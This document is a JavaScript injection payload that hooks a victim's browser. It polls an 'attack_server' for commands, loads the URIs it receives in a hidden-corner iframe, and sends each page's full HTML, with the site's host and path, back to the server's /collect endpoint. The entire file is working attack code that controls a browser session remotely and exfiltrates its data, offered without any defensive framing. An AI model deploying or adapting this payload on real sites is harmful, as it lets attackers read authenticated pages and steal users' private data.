(function() {

    // destination
    var attack_server = 'http://localhost:5000/'
    var session = 'foobar'

    var ajax = function(method, url, data, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4 && xhr.status == 200) {
                if (callback) {
                    callback(xhr.responseText);
                }
            }
        }
        var payload = JSON.stringify(data)
        if (payload) {
            xhr.send('host='+encodeURIComponent(window.location.protocol + '//' + window.location.host)+
                '&uri='+encodeURIComponent((location.pathname+location.search).substr(1))+
                '&session='+encodeURIComponent(session)+
                '&payload=' + encodeURIComponent(payload));
        } else {
            xhr.send();
        }
    }

    var ajaxGet = function(url, callback) {
        ajax('GET', url, false, callback);
    }

    var ajaxPost = function(url, data, callback) {
        ajax('POST', url, data, callback);
    }

    var grabDom = function() {
        var stringified = iframe.contentDocument.documentElement.innerHTML;
        ajaxPost(attack_server + 'collect', stringified);
    }

    var navigate = function(url) {
        iframe.onload = grabDom;
        iframe.src = url;
    }

    var executeCommand = function(command) {
        console.log('Executing command ', command);
        if (command['method'] == 'GET') {
            console.log('navigating frame to ',command['uri']);
            navigate(command['uri']);
        }
    }

    var getCommands = function() {
        ajaxGet(attack_server + 'getnext/' + session, function(data) {
            var commands = JSON.parse(data);
            for (var i = 0; i < commands.length; i++) {
                executeCommand(commands[i]);
            }
            setTimeout(getCommands, 1000);
        });
    }





    // initialize the iframe
    var iframe = document.createElement('iframe');
    iframe.style.width = '200px';
    iframe.style.height = '200px';
    iframe.style.position = 'absolute';
    iframe.style.bottom = '0';
    iframe.style.right = '0';
    iframe.style.border = '1px solid #f00';
    document.body.appendChild(iframe);

    getCommands();

})();